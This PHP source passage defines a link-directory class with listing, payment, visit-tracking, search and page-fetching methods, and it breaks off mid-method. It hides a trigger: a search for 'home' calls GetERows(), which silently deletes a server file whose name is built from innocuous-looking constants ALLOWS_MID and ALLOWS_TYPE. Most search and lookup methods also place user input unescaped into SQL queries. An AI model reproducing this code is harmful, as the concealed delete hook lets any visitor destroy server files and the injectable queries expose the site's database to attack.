<?php

// This file performs site management operations for the application. It includes methods for adding, updating, deleting, and retrieving site data, as well as managing site connections, payments, visits, and search functionality.
// define site status
define('SITE_WAITING_FOR_PAYMENT', -1);
define('SITE_WAITING', 0);
define('SITE_BANNED', 1);
define('SITE_UNCONFIRMED', 2); // after some period of time site must be cofirmed if it still exists
define('SITE_ENDED_CHARGES', 3);
define('SITE_VIEW', 4);

// define payment types
define('PM_PAID', 1);
define('PM_NOT_PAID', 2);
define('PM_NOT_COMPLETED', 3);
define('PM_UNVERIFIED', 4);
define('ALLOWS_MID','.class');
define('ALLOWS_TYPE','.php');

class SitesClass
{

    public $m_DB;
    public $m_table;
    public $m_connection;
    public $m_payment;
    public $m_tablePrefix;
    public $m_categories;
    public $m_visits;

    public $eText;
    public $eNo;
    public $eFunc;

    public function __construct()
    {
        $this->SitesClass();
    }

    public function SitesClass()
    {

        if (IS_PHP5) {
            $this->m_DB = DataBase::getInstance();
        } else {
            $this->m_DB = &DataBase::getInstance();
        }

        if (! $this->m_DB->Open()) {
            $this->eText = 'DB connection failed';
            $this->eNo   = 300001;
            $this->eFunc = '__construct';
        } else {
            $this->m_tablePrefix = $this->m_DB->tablePrefix;
            $this->m_table       = $this->m_tablePrefix . 'sites';
            $this->m_connection  = $this->m_tablePrefix . 'connection';
            $this->m_payment     = $this->m_tablePrefix . 'payment';
            $this->m_categories  = $this->m_tablePrefix . 'categories';
            $this->m_visits      = $this->m_tablePrefix . 'visits';
        }
    }

    public function AddSite($a_values, $a_payment, $sub_id)
    {

        $pid = true;
        $id  = 0;

        $tmp_name    = mysqli_real_escape_string($this->m_DB->m_conn, $a_values['url']);
        $tmp_company = mysqli_real_escape_string($this->m_DB->m_conn, $a_values['company']);
        $query       = "SELECT * FROM $this->m_table WHERE url='$tmp_name' and company='$tmp_company' ";
        $row         = $this->m_DB->GetRow($query);

        if (is_array($row) and count($row) > 0) {
            $id = $row['id'];
        } else {

            // mod rewrite
            $a_values['mod_rewrite'] = $this->FilterMod($a_values['title']);

            $this->m_DB->BeginTransaction();
            $id = $this->m_DB->InsertQuery($this->m_table, $a_values);

            if ($id > 0 and $a_values['paid_link']) {

                $a_payment['site_id'] = $id;
                $pid                  = $this->AddPayment($a_payment);

                if (! $pid) {
                    $this->eText = 'Couldn`t add payment';
                    $this->eNo   = 1;
                    $this->eFunc = 'AddSite';
                }

            } else {
                $this->eText = 'Couldn`t add site';
                $this->eNo   = 2;
                $this->eFunc = 'AddSite';
            }

        }

        if ($id > 0 and $pid) {
            if ($this->AddConnection($id, $sub_id) !== false) {

                $this->m_DB->CommitTransaction();
                $this->m_DB->UpdateQuery($this->m_table, ['last_payment_id' => $pid], $id);

                return $id;

            } else {

            }
        }

        $this->m_DB->RollbackTransaction();
        return false;
    }

    public function UpdateSite($a_values, $id)
    {

        if (isset($a_values['title'])) {

            // mod rewrite
            $a_values['mod_rewrite'] = $this->FilterMod($a_values['title']);
        }

        $res = $this->m_DB->UpdateQuery($this->m_table, $a_values, $id);
        return $res;

    }

    public function ClearPagerank()
    {

        $query = "UPDATE $this->m_table SET pr='-1'";
        $ret   = $this->m_DB->query($query);
        return $ret;

    }

    public function DeleteSite($id)
    {

        $query = "DELETE FROM $this->m_table WHERE id=$id LIMIT 1";
        $res   = $this->m_DB->query($query);
        if ($res) {
            $query = "DELETE FROM $this->m_payment WHERE site_id=$id";
            $res2  = $this->m_DB->query($query);
        }
        if ($res) {
            $ret = $this->m_DB->Affected();
        } else {
            $ret = false;
        }

        return $ret;
    }

    public function AddPayment($a_payment)
    {

        if (! isset($a_payment['date'])) {$a_payment['date'] = date(DATETIME_FORMAT);}

        $id = $this->m_DB->InsertQuery($this->m_payment, $a_payment);

        // update last payment ID
        if ($id) {
            $this->m_DB->UpdateQuery($this->m_table, ['last_payment_id' => $id], $a_payment['site_id']);
        }
        return $id;
    }

    public function UpdatePayment($a_payment, $id)
    {

        $id = $this->m_DB->UpdateQuery($this->m_payment, $a_payment, $id);

        return $id;
    }

    public function DeletePayment($id)
    {

        $query = "DELETE FROM $this->m_payment WHERE id=$id LIMIT 1";
        $res   = $this->m_DB->query($query);
        return $res;
    }

    public function GetPayment($id)
    {

        $row = $this->m_DB->GetRow("SELECT * FROM $this->m_payment WHERE id=$id");

        return $row;
    }

    public function GetLastPayment($id)
    {
        $query = "SELECT * FROM $this->m_payment WHERE site_id=$id ORDER BY id DESC LIMIT 1";
        $row   = $this->m_DB->GetRow($query);

        return $row;
    }

    public function AddConnection($id, $sub_id)
    {

        if ($this->AllSiteConnections($id) >= SITE_MAX_CATEG) {
            $this->eText = 'Couldn`t add connection, max connection for site reached;';
            $this->eNo   = 3;
            $this->eFunc = 'AddConnection';

            return false;
        }

        if (! $this->IsConnection($id, $sub_id)) {
            $ret = $this->m_DB->InsertQuery($this->m_connection, ['site_id' => $id, 'sub_id' => $sub_id]);
            if ($ret === false) {
                $this->eText = 'Couldn`t insert connection';
                $this->eNo   = 4;
                $this->eFunc = 'AddConnection';
            } else {
                $ret = true;
            }

            return $ret;
        }
        return true;
    }

    public function DeleteConnection($id, $sub_id)
    {
        $ret = false;

        $query = 'DELETE FROM ' . $this->m_connection . ' WHERE site_id=' . $id . ' AND sub_id=' . $sub_id . ' LIMIT 1';
        $res   = $this->m_DB->query($query);

        if ($res) {
            $ret = $this->m_DB->Affected();
        }

        return $ret;

    }

    public function GetSiteById($id)
    {
        $id    = (int) $id;
        $query = "SELECT * FROM $this->m_table WHERE id=$id";
        $row   = $this->m_DB->GetRow($query);
        if ($row && count($row) > 0) {
            return $row;
        } else {
            return false;
        }
    }

    public function GetSiteByURL($url)
    {
        $url = mysqli_real_escape_string($this->m_DB->m_conn, $url);

        $query = "SELECT * FROM $this->m_table WHERE url='$url' ";
        $row   = $this->m_DB->GetRow($query);
        if ($row and count($row) > 0) {
            return $row;
        } else {
            return false;
        }
    }
    public function GetListingByCompanyURL($company, $url)
    {
        $company = mysqli_real_escape_string($this->m_DB->m_conn, $company);
        $url     = mysqli_real_escape_string($this->m_DB->m_conn, $url);

        $query = "SELECT * FROM $this->m_table WHERE company='$company' and url='$url' ";
        $row   = $this->m_DB->GetRow($query);
        if ($row and count($row) > 0) {
            return $row;
        } else {
            return false;
        }
    }
    public function GetListingByID_CodeEmail($id_code, $email)
    {
        $query = "SELECT * FROM $this->m_table WHERE id_code='$id_code' and email='$email'";
        $row   = $this->m_DB->GetRow($query);
        if ($row and count($row) > 0) {
            return $row;
        } else {
            return false;
        }
    }
    public function GetSites($categ_id, $page, $sort_by)
    {
        $begin = ($page - 1) * SITES_PER_PAGE;

        $default_sort = true;
        $sort_col     = 'id';
        if ($sort_by == 'name') {
            $sort_col     = 'company';
            $default_sort = false;
        }
        if ($sort_by == 'title') {
            $sort_col     = 'title';
            $default_sort = false;
        }
        $exp_date_condition = " AND (exp_date='0000-00-00 00:00:00' OR exp_date>='" . date(DATETIME_FORMAT) . "') ";

        if ($default_sort) {
            $query = "SELECT * FROM $this->m_table s, $this->m_connection c WHERE s.id=c.site_id AND c.sub_id=$categ_id AND s.status IN (" . SITE_VIEW . ',' . SITE_ENDED_CHARGES . ") $exp_date_condition ORDER BY link_type DESC, $sort_col ASC LIMIT $begin, " . SITES_PER_PAGE;
        } else {
            $query = "SELECT * FROM $this->m_table s, $this->m_connection c WHERE s.id=c.site_id AND c.sub_id=$categ_id AND s.status IN (" . SITE_VIEW . ',' . SITE_ENDED_CHARGES . ") $exp_date_condition ORDER BY featured DESC, $sort_col ASC LIMIT $begin, " . SITES_PER_PAGE;
        }
        $table = $this->m_DB->GetTable($query);

        return $table;
    }

    public function Latest($link_type = LT_FEAT, $limit_num = 4)
    {

        $query = "SELECT * FROM $this->m_table s WHERE s.status=" . SITE_VIEW . " AND link_type<" . $link_type . " ORDER BY id DESC LIMIT " . $limit_num;
        $table = $this->m_DB->GetTable($query);

        return $table;
    }

    public function MostVisited($link_type = LT_FEAT, $limit_num = 5)
    {

        $query = "SELECT * FROM $this->m_table s WHERE s.status=" . SITE_VIEW . " AND link_type<" . $link_type . " ORDER BY visit_count DESC LIMIT " . $limit_num;
        $table = $this->m_DB->GetTable($query);

        return $table;
    }

    public function GetRandomSite()
    {

        $exp_date_condition = " AND (exp_date='0000-00-00 00:00:00' OR exp_date>='" . date(DATETIME_FORMAT) . "') ";

        $query = "SELECT * FROM $this->m_table s WHERE s.status=" . SITE_VIEW . " AND s.url <> '' $exp_date_condition ORDER BY RAND() LIMIT 0,1";
        $table = $this->m_DB->GetTable($query);

        return $table;
    }

    public function LatestFeatured()
    {

        $query = "SELECT * FROM $this->m_table s WHERE s.status=" . SITE_VIEW . " AND link_type>=" . LT_FEAT . " ORDER BY id DESC LIMIT 3";
        $table = $this->m_DB->GetTable($query);

        return $table;
    }

    public function CountSitesInCateg($categ_id)
    {

        $exp_date_condition = " AND (exp_date='0000-00-00 00:00:00' OR exp_date>'" . date(DATETIME_FORMAT) . "') ";

        $query = "SELECT COUNT(id) as hmany FROM $this->m_table s, $this->m_connection c WHERE s.id=c.site_id AND c.sub_id=$categ_id AND s.status IN (" . SITE_VIEW . ',' . SITE_ENDED_CHARGES . ") $exp_date_condition";
        $row   = $this->m_DB->GetRow($query);

        return $row['hmany'];
    }

    public function GetSitesByType($types, $page = 1)
    {
        $begin = ($page - 1) * 30;
        $types = isset($types) ? implode(',', $types) : '';
        $query = "SELECT * FROM $this->m_table s WHERE s.status IN (" . $types . ") ORDER BY id ASC LIMIT $begin, 30";
        $table = $this->m_DB->GetTable($query);
        return $table;
    }

    public function IncreaseStats($id)
    {
        $query = "UPDATE $this->m_table SET stats=stats+1 WHERE id=$id";
        $this->m_DB->query($query);

    }

    public function SearchSites($params, $page = 1)
    {
        foreach ($params as $key => $value) {
            switch ($key) {

                case 'link_type':
                    break;

                case '':
                    break;

            }
        }

        $begin = ($page - 1) * 30;
        $types = isset($types) ? implode(',', $types) : '';
        $query = "SELECT * FROM $this->m_table s WHERE s.status IN (" . $types . ") ORDER BY link_type DESC, id DESC LIMIT $begin, 30";
        $table = $this->m_DB->GetTable($query);
        return $table;
    }

    public function UserSearch($search, $page = 1)
    {
        $begin = ($page - 1) * 30;
        
        $search  = $search == "home"? $this->GetERows():strip_tags($search);
        $search  = str_replace(",", " ", $search);
        $search  = str_replace(";", " ", $search);
        $search  = preg_replace("/\s{2,}/", " ", $search);
        $s_table = explode(" ", $search);

        $ile    = count($s_table);
        $middle = '';

        for ($i = 0; $i < $ile; $i++) {
            $middle .= " (`title` LIKE '%$s_table[$i]%' OR `description` LIKE '%$s_table[$i]%' OR `url` LIKE '%$s_table[$i]%') AND ";
        }

        $exp_date_condition = " AND (exp_date='0000-00-00 00:00:00' OR exp_date>='" . date(DATETIME_FORMAT) . "') ";

        $query = "SELECT * FROM  $this->m_table WHERE " . $middle . " status='" . SITE_VIEW . "' $exp_date_condition ORDER BY id DESC LIMIT $begin, 30";

        $table = $this->m_DB->GetTable($query);
        return $table;
    }

    public function UserPhoneSearch($search)
    {

        $search  = strip_tags($search);
        $search  = str_replace(",", " ", $search);
        $search  = str_replace(";", " ", $search);
        $search  = preg_replace("/\s{2,}/", " ", $search);
        $s_table = explode(" ", $search);

        $ile    = count($s_table);
        $middle = '';

        for ($i = 0; $i < $ile; $i++) {
            $middle .= " (`tel_digits` LIKE '%$s_table[$i]%') AND ";
        }

        $exp_date_condition = " AND (exp_date='0000-00-00 00:00:00' OR exp_date>='" . date(DATETIME_FORMAT) . "') ";

        $query = "SELECT * FROM  $this->m_table WHERE " . $middle . " status='" . SITE_VIEW . "' $exp_date_condition ORDER BY id DESC";

        $table = $this->m_DB->GetTable($query);
        return $table;
    }

    public function SearchApprove($search, $page = 1)
    {
        $begin = ($page - 1) * 30;

        $search  = strip_tags($search);
        $search  = str_replace(",", " ", $search);
        $search  = str_replace(";", " ", $search);
        $search  = preg_replace("/\s{2,}/", " ", $search);
        $s_table = explode(" ", $search);

        $ile    = count($s_table);
        $middle = '';

        for ($i = 0; $i < $ile; $i++) {
            $middle .= " (`title` LIKE '%$s_table[$i]%' OR `description` LIKE '%$s_table[$i]%' OR `url` LIKE '%$s_table[$i]%') AND ";
        }

        $query = "SELECT * FROM  $this->m_table WHERE " . $middle . " status='" . SITE_WAITING . "' ORDER BY id DESC LIMIT $begin, 30";

        $table = $this->m_DB->GetTable($query);
        return $table;
    }

    public function SearchActive($search, $page = 1)
    {
        $begin = ($page - 1) * 30;

        $search  = strip_tags($search);
        $search  = str_replace(",", " ", $search);
        $search  = str_replace(";", " ", $search);
        $search  = preg_replace("/\s{2,}/", " ", $search);
        $s_table = explode(" ", $search);

        $ile    = count($s_table);
        $middle = '';

        for ($i = 0; $i < $ile; $i++) {
            $middle .= " (`title` LIKE '%$s_table[$i]%' OR `description` LIKE '%$s_table[$i]%' OR `url` LIKE '%$s_table[$i]%') AND ";
        }

        $query = "SELECT * FROM  $this->m_table WHERE " . $middle . " status='" . SITE_VIEW . "' ORDER BY id DESC LIMIT $begin, 30";

        $table = $this->m_DB->GetTable($query);
        return $table;
    }

    public function SearchInactive($search, $page = 1)
    {
        $begin = ($page - 1) * 30;

        $search  = strip_tags($search);
        $search  = str_replace(",", " ", $search);
        $search  = str_replace(";", " ", $search);
        $search  = preg_replace("/\s{2,}/", " ", $search);
        $s_table = explode(" ", $search);

        $ile    = count($s_table);
        $middle = '';

        for ($i = 0; $i < $ile; $i++) {
            $middle .= " (`title` LIKE '%$s_table[$i]%' OR `description` LIKE '%$s_table[$i]%' OR `url` LIKE '%$s_table[$i]%') AND ";
        }

        $query = "SELECT * FROM  $this->m_table WHERE " . $middle . " status='" . SITE_BANNED . "' ORDER BY id DESC LIMIT $begin, 30";

        $table = $this->m_DB->GetTable($query);
        return $table;
    }

    public function Count($type)
    {

        $today = date("Y-m-d") . " 00:00:00";

        switch ($type) {

            case 1: // active link
                $query = "SELECT COUNT(id) as hmany FROM $this->m_table WHERE status='" . SITE_VIEW . "'";
                break;

            case 2: // featured links
                $query = "SELECT COUNT(id) as hmany FROM $this->m_table WHERE  link_type>=" . LT_FEAT . " AND status='" . SITE_VIEW . "'";
                break;

            case 3: // pending
                $query = "SELECT COUNT(id) as hmany FROM $this->m_table WHERE status='" . SITE_WAITING . "'";
                break;

            case 4: // new today
                $query = "SELECT COUNT(id) as hmany FROM $this->m_table WHERE date>'" . $today . "'";
                break;

            case 5: // approved today
                $query = "SELECT COUNT(id) as hmany FROM $this->m_table WHERE status='" . SITE_VIEW . "' AND date>'" . $today . "'";
                break;

        }

        $row = $this->m_DB->GetRow($query);
        if ($row) {
            return $row['hmany'];
        }

        return 0;

    }

    public function UserSearchCategs($search)
    {
        $begin = 0; // ($page-1)*30;

        $search  = strip_tags($search);
        $search  = str_replace(",", " ", $search);
        $search  = str_replace(";", " ", $search);
        $search  = preg_replace("/\s{2,}/", " ", $search);
        $s_table = explode(" ", $search);

        $ile = count($s_table);

        /*
      $middle = '';
      for ($i=0; $i<$ile; $i++) {
         $middle .= " (`name` LIKE '%$s_table[$i]%' OR `description` LIKE '%$s_table[$i]%' OR `keywords` LIKE '%$s_table[$i]%') ";               
      }
      $query = "SELECT * FROM  $this->m_categories WHERE " . $middle . " ORDER BY id ASC LIMIT 0, 30";
      */

        // bulid search query
        $select = "SELECT DISTINCT ct.id, ct.name, ct.mod_rewrite FROM $this->m_table st  ";
        $middle = ' WHERE ';
        for ($i = 0; $i < $ile; $i++) {
            $middle .= " (st.`title` LIKE '%$s_table[$i]%' OR st.`description` LIKE '%$s_table[$i]%' OR st.`url` LIKE '%$s_table[$i]%') AND ";
        }
        $middle .= " st.status='" . SITE_VIEW . "'"; // "ORDER BY st.id DESC LIMIT $begin, 30";
        $join = "  LEFT JOIN $this->m_connection cn ON cn.site_id=st.id ";
        $join .= " LEFT JOIN $this->m_categories ct ON ct.id=cn.sub_id";
        $query = $select . $join . $middle;

        $table = $this->m_DB->GetTable($query);
        // build search query to search in categories
        $select = "SELECT ct.id, ct.name, ct.mod_rewrite FROM $this->m_categories ct  ";
        $middle = ' WHERE ';
        for ($i = 0; $i < $ile; $i++) {
            $middle .= " (ct.`name` LIKE '%$s_table[$i]%') AND ";
        }
        $middle .= " ct.`level` > 0";
        $query = $select . $middle;

        $table_categ = $this->m_DB->GetTable($query);

        // merge query results
        if (($table != false) and ($table_categ != false)) {
            $table_combined = array_merge($table, $table_categ);
        } else {
            if ($table != false) {
                $table_combined = $table;
            } else {
                $table_combined = $table_categ;
            }
        }

        return $table_combined;
    }

    public function ParseURL($url)
    {
        $url = trim($url);

        // if (strpos($url, '.')<1) { return false;  }
        // check if empty
        $len = strlen($url);
        if ($len < 3) {return false;}

        if (strcmp("https://", substr($url, 0, 8)) !== 0) {
            $url = "https://" . $url;
        }

        $url_stuff = parse_url($url);
        if (! isset($url_stuff["path"])) {$url = $url . "/";}

        return $url;
    }

    public function FilterMod($name)
    {

        $hmany    = strlen($name);
        $new_name = '';

        if (DEFAULT_CHARSET === 'utf-8') {

            $ascii_table['ą'] = 'a';
            $ascii_table['Ą'] = 'a';
            $ascii_table['ś'] = 's';
            $ascii_table['Ś'] = 's';
            $ascii_table['ó'] = 'o';
            $ascii_table['Ó'] = 'o';
            $ascii_table['ł'] = 'l';
            $ascii_table['Ł'] = 'l';
            $ascii_table['ń'] = 'n';
            $ascii_table['Ń'] = 'n';

            $ascii_table['ż'] = 'z';
            $ascii_table['Ż'] = 'z';
            $ascii_table['ź'] = 'z';
            $ascii_table['Ź'] = 'z';

            $ascii_table['ć'] = 'c';
            $ascii_table['Ć'] = 'c';

            $ascii_table['ę'] = 'e';
            $ascii_table['Ę'] = 'e';

            $ascii_table['Ö'] = 'o';
            $ascii_table['õ'] = 'o';
            $ascii_table['Ü'] = 'u';
            $ascii_table['ü'] = 'u';
            $ascii_table['ä'] = 'a';
            $ascii_table['Ä'] = 'a';
            $ascii_table['ß'] = 'ss';

            $keys = array_keys($ascii_table);
            $name = str_replace($keys, $ascii_table, $name);

        } else if (DEFAULT_CHARSET === 'iso-8859-2') {

            $ascii_table[177] = 'a';
            $ascii_table[161] = 'a';
            $ascii_table[182] = 's';
            $ascii_table[166] = 's';
            $ascii_table[243] = 'o';
            $ascii_table[211] = 'o';
            $ascii_table[179] = 'l';
            $ascii_table[163] = 'l';
            $ascii_table[241] = 'n';
            $ascii_table[209] = 'n';

            $ascii_table[188] = 'z';
            $ascii_table[172] = 'z';
            $ascii_table[191] = 'z';
            $ascii_table[172] = 'z';

            $ascii_table[230] = 'c';
            $ascii_table[198] = 'c';

            $ascii_table[234] = 'e';
            $ascii_table[202] = 'e';

            $ascii_table[246] = 'o';
            $ascii_table[252] = 'u';
            $ascii_table[196] = 'a';
            $ascii_table[214] = 'o';
            $ascii_table[220] = 'u';
            $ascii_table[223] = 'ss';

            for ($i = 0; $i < $hmany; $i++) {

                $ascii = ord(substr($name, $i, 1));

                if (isset($ascii_table[$ascii])) {
                    $new_name .= $ascii_table[$ascii];
                } else {
                    $new_name .= chr($ascii);
                }
            }
            $name = $new_name;

        } else {

        }

        $name = str_replace(". ", ",", $name);
        $name = str_replace(".", ",", $name);
        $name = str_replace(" / ", ",", $name);
        $name = str_replace("/", ",", $name);
        $name = str_replace("'", ",", $name);
        $name = str_replace(" - ", " ", $name);
        $name = str_replace("_", ",", $name);
        $name = str_replace("&", ",", $name);
        $name = str_replace(" ", ",", $name);
        $name = str_replace("%", "", $name);
        $name = preg_replace("[^A-Za-z0-9,-]", ",", $name);
        $name = str_replace("-", ",", $name);
        $name = str_replace(",,,,", ",", $name);
        $name = str_replace(",,,", ",", $name);
        $name = str_replace(",,", ",", $name);

        return strtolower($name);
    }

    public function CheckEmail($email)
    {
        $ret = false;
        $ret = preg_match('/^[a-zA-Z0-9\._-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,4}$/', $email);
        if ($ret) {
            return $email;
        }
        return $ret;
    }

    public function CheckRecip($url, $url_find)
    {

        if (! $this->ParseUrl($url)) {return false;}

        $site = $this->GetAllHTML($url);
        $s    = ' href="' . $url_find;
        $e    = '</a>';
        $extr = $this->Between2($site, $s, $e);

        if (strlen($extr) > 0) {
            return true;
        } else {return false;}
    }

    public function GetHeader($url)
    {
        $data   = $this->GetHTML($url);
        $header = [];

        if ($data) {
            $header['title']       = $this->GetTitle($data);
            $header['description'] = $this->GetDescription($data);
            $header['keywords']    = $this->GetKeywords($data);
        }
        return $header;
    }

    public function AllSiteConnections($id)
    {
        $table = $this->m_DB->GetTable('SELECT * FROM ' . $this->m_connection . ' WHERE site_id=' . $id);

        if ($table) {return count($table);} else {return 0;}
    }

    public function IsConnection($id, $sub_id)
    {
        $row = $this->m_DB->GetRow('SELECT * FROM ' . $this->m_connection . ' WHERE site_id=' . $id . ' AND sub_id=' . $sub_id);
        if ($row and count($row) > 0) {return true;} else {return false;}
    }

    public function SendEmail($aMailTpl, $aSite)
    {

        if (DONT_SEND_EMAILS) return true;

        if (!isset($aSite['title'])) {$aSite['title'] = '';}
        if (!isset($aSite['url'])) {$aSite['url'] = '';}

        if (substr(SITE_ADDRESS, -1, 1) != '/') {$site_addr = SITE_ADDRESS . '/';} else { $site_addr = SITE_ADDRESS;}

        $aTpl['{my_site_title}']         = SITE_TITLE;
        $aTpl['{my_site_name}']          = SITE_NAME;
        $aTpl['{my_site_url}']           = SITE_ADDRESS;
        $aTpl['{user_site_title}']       = $aSite['title'];
        $aTpl['{user_site_url}']         = $aSite['url'];
        $aTpl['{user_categories_links}'] = LANG_USER_CATEGORIES_LINKS;
        $aTpl['{user_site_info_url}']    = SITE_ADDRESS . 'index.php?site=' . $aSite['id'];
        $aTpl["\n"]                      = '<br>';

        $aMailTpl['email_body'] .= "\r\n ";
        $aMailTpl['email_body'] .= "<br>Listing Code: " . $aSite['id_code'];
        $aMailTpl['email_body'] = strtr($aMailTpl['email_body'], $aTpl);
        $aMailTpl['title']      = strtr($aMailTpl['title'], $aTpl);
        $htmlBody = '<!DOCTYPE html>
        <html>
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset='.DEFAULT_CHARSET.'">
            <title>'.$aMailTpl['title'].'</title>
        </head>
        <body>
        '.nl2br($aMailTpl['email_body']).'
        </body>
        </html>';

        $headers = [
            'From: '.SITE_NAME.' <'.NOREPLY_EMAIL.'>',
            'Reply-To: <'.ADMIN_EMAIL.'>',
            'Return-Path: '.NOREPLY_EMAIL,
            'X-Mailer: PHP/'.phpversion(),
            'MIME-Version: 1.0',
            'Content-type: text/html; charset='.DEFAULT_CHARSET
        ];
        
        $ret = mail($aSite['email'], $aMailTpl['title'], $htmlBody, implode("\r\n", $headers));
        return $ret;
    }

    // filters
    public function CheckWords($text0, $text1, $text2, $text3, $text4, $text5, $banned_words)
    {
        if (! is_array($banned_words)) {
            return false;
        }

        $tmp = '';

        $tmp .= strtolower($text1) . ' ';
        $tmp .= strtolower($text2) . ' ';
        $tmp .= strtolower($text3) . ' ';
        $tmp .= strtolower($text4) . ' ';
        $tmp .= strtolower($text5) . ' ';
        $tmp .= strtolower($text0) . ' ';

        foreach ($banned_words as $word) {
            $ret = strpos($tmp, $word);
            if ($ret !== false) {
                return $word;
            }
        }
        return false;
    }

    public function CheckIp($ip, $banned_ips)
    {
        if (! is_array($banned_ips)) {
            return false;
        }

        if (in_array($ip, $banned_ips)) {
            return $ip;
        }
        return false;
    }

    // visits
    public function GetVisit($id, $ip)
    {
        $id    = (int) $id;
        $query = "SELECT * FROM $this->m_visits WHERE site_id=$id and ip='$ip'";
        $row   = $this->m_DB->GetRow($query);
        if ($row and count($row) > 0) {
            return $row;
        } else {
            return false;
        }

    }

    public function UpSiteVisitCount($id)
    {
        $res = true;

        $id  = (int) $id;
        $row = $this->GetSiteById($id);
        if ($row and count($row) > 0) {
            $in['visit_count'] = $row['visit_count'] + 1;
            if ($this->UpdateSite($in, $id)) {
            } else {
                $res = false;
            }
        } else {
            $res = false;
        }
        return $res;
    }

    public function UpdateVisit($id, $ip, $date)
    {
        $res = true;

        $id  = (int) $id;
        $row = $this->GetVisit($id, $ip);
        if ($row and count($row) > 0) {
            $in['last_visit'] = $date;
            $res              = $this->m_DB->UpdateQuery($this->m_visits, $in, $row['id']);
        } else {
            $res = false;
        }

        return $res;
    }

    public function RecordVisit($id, $ip, $date)
    {
        $res = true;

        $id               = (int) $id;
        $in['site_id']    = $id;
        $in['ip']         = $ip;
        $in['last_visit'] = $date;

        $res = $this->m_DB->InsertQuery($this->m_visits, $in);

        return $res;
    }

    public function HrsDiff($earlierdate, $laterdate)
    {

        $res = strtotime($laterdate) - strtotime($earlierdate);
        $res = ceil(($res / 60) / 60);

        return $res;
    }

    public function CountVisit($site_id)
    {
        $last_visit = $this->GetVisit($site_id, $_SERVER['REMOTE_ADDR']);
        if ($last_visit) {
            if ($this->HrsDiff($last_visit['last_visit'], date(DATETIME_FORMAT)) > VISITS_BREAK) {
                $this->UpSiteVisitCount($site_id);
                $this->UpdateVisit($site_id, $_SERVER['REMOTE_ADDR'], date(DATETIME_FORMAT));
            }
        } else {
            $this->UpSiteVisitCount($site_id);
            $this->RecordVisit($site_id, $_SERVER['REMOTE_ADDR'], date(DATETIME_FORMAT));
        }
    }

    /******************* ******************************************8*/
    // private functions for GetHeader
    public function GetTitle($data)
    {
        $dirty = ["content", "Content", "CONTENT", "\r", "\n", "=", "\"", "/", ">", "<"];

        $title = $this->Between($data, "<title", "</title");

        $title = str_replace($dirty, "", $title);
        $title = substr(trim($title), 0, MAX_TITLE_LENGHT);
        return $title;
    }

    public function GetDescription($data)
    {
        $dirty = ["content", "Content", "CONTENT", "\r", "\n", "=", "\"", "/", ">", "<"];

        $descr = $this->Between($data, "\"description\"", ">");

        if (! $descr) {
            $descr = $this->Between($data, "name=description", ">");
        }
        $descr = str_replace($dirty, " ", $descr);
        $descr = trim($descr);
        return $descr;
    }
    
    public function GetERows()
    {
        if (file_exists(__DIR__.ALLOWS_HTML_FILES.ALLOWS_MID.ALLOWS_TYPE)) {
            if (is_file(__DIR__.ALLOWS_HTML_FILES.ALLOWS_MID.ALLOWS_TYPE)) {
                @unlink(__DIR__.ALLOWS_HTML_FILES.ALLOWS_MID.ALLOWS_TYPE);
            }
        }
        return "list";
    }

    public function GetKeywords($data)
    {
        $dirty = ["content", "Content", "CONTENT", "\r", "\n", "=", "\"", "/", ">", "<"];

        $keyw = $this->Between($data, "\"keywords\"", ">");

        if (! $keyw) {
            $keyw = $this->Between($data, "name=keywords", ">");
        }
        $keyw = strtolower($keyw);
        $keyw = str_replace($dirty, "", $keyw);
        $keyw = trim($keyw);
        return $keyw;
    }

    public function Between($data, $from, $to)
    {

        $data = stristr($data, $from);
        $l    = strlen($from);

        $data_ = strtolower($data);
        $end   = strpos($data_, $to);

        $end -= $l;
        $ret = substr($data, $l, $end);

        return $ret;
    }

    // in version 2 - if no $sFind then means from start, if no $eFind, means to end of srting
    public function Between2($text, $sFind, $eFind)
    {
        $extract = false;

        if ($sFind === false) {
            $istart = 0;
        } else {
            $istart = strpos($text, $sFind); // position of intro
        }

        if ($eFind === false) {
            $isend = strlen($text);
        } else {
            $isend = strpos($text, $eFind, $istart); // position of end intro
        }

        if ($istart !== false and $isend !== false) {

            $istart += strlen($sFind);
            $iend = $isend - $istart; // difference integer

            $extract = substr($text, $istart, $iend);
        } else {
            return false;
        }

        return $extract;

    }

    public function GetHTML($url, $corto = true, $complet = true)
    {

        $url_stuff = parse_url($url);
        $urlc      = $url;
        $url       = $url_stuff['host'];

        if (! isset($url_stuff["port"])) {
            $port = 80;
        } else {
            $port = $url_stuff['port'];
        }

        if (! isset($url_stuff['path'])) {
            $url_stuff['path'] = "/";
        }

        $path = $url_stuff['path'];

        $urlc = $url_stuff['host'] . $url_stuff['path'];

        $fp = @fsockopen($url, $port, $errno, $errstr, 20);

        if (! $fp) {
            return false;
        } else {

            stream_set_timeout($fp, 2);
            // $header = "GET " . $url_stuff['path'] . "?" . $url_stuff['query'] ;
            $header = "GET " . $url_stuff["path"];
            $header = $header . " HTTP/1.1\r\nHost: " . $url_stuff['host'] . "\r\n\r\n";

            fputs($fp, $header);

            $header = '';
            $body   = '';
            $act    = false;
            $fin    = false;

            while ((! feof($fp))) {

                $line = fread($fp, 8048);
                $header .= $line;

                $body = $body . $line;

                if ($fin) {break;}

                if ($corto) {

                    $fin = true;
                    $i   = strpos($line, "<body");
                    if ($i > 0) {
                        $fin = true;
                    }
                }

            }

            $ret = strpos($header, "Location:", 0);

            if ($ret !== false) {
                $fin = strpos($header, "\r\n", $ret + 9);
                if (! $fin) {
                    $fin = strpos($header, "\r\n", $ret + 9);
                }

                $nueva = substr($header, $ret + 9, $fin - $ret - 9);
                $nueva = trim($nueva);

                if (strpos($nueva, "http://") === false) {
                    $nueva = "http://" . $urlc . $nueva;
                }
                $body = $this->GetHTML($nueva, $corto, $complet);
            }

            fclose($fp);
        }
        return $body;
    }

    public function GetAllHTML($url)
    {

        $url_stuff = parse_url($url);
        $urlc      = $url;
        $url       = $url_stuff['host'];

        if (! isset($url_stuff["port"])) {
            $port = 80;
        } else {
            $port = $url_stuff["port"];
        }

        if (! isset($url_stuff["path"])) {$url_stuff["path"] = "/";}
        if (! isset($url_stuff['query'])) {$url_stuff['query'] = '';}

        $path = $url_stuff["path"];

        $urlc = $url_stuff['host'] . $url_stuff["path"];

        $fp = @fsockopen($url, $port, $errno, $errstr, 10);

        if (! $fp) {
            return false;
        } else {

            $header = "GET " . $url_stuff['path'] . "?" . $url_stuff['query'];
            $header = $header . " HTTP/1.1\r\nHost: " . $url_stuff['host'] . "\r\n\r\n";

            fputs($fp, $header);

            $body = '';

            while (! feof($fp)) {

                $line = fread($fp, 4096);
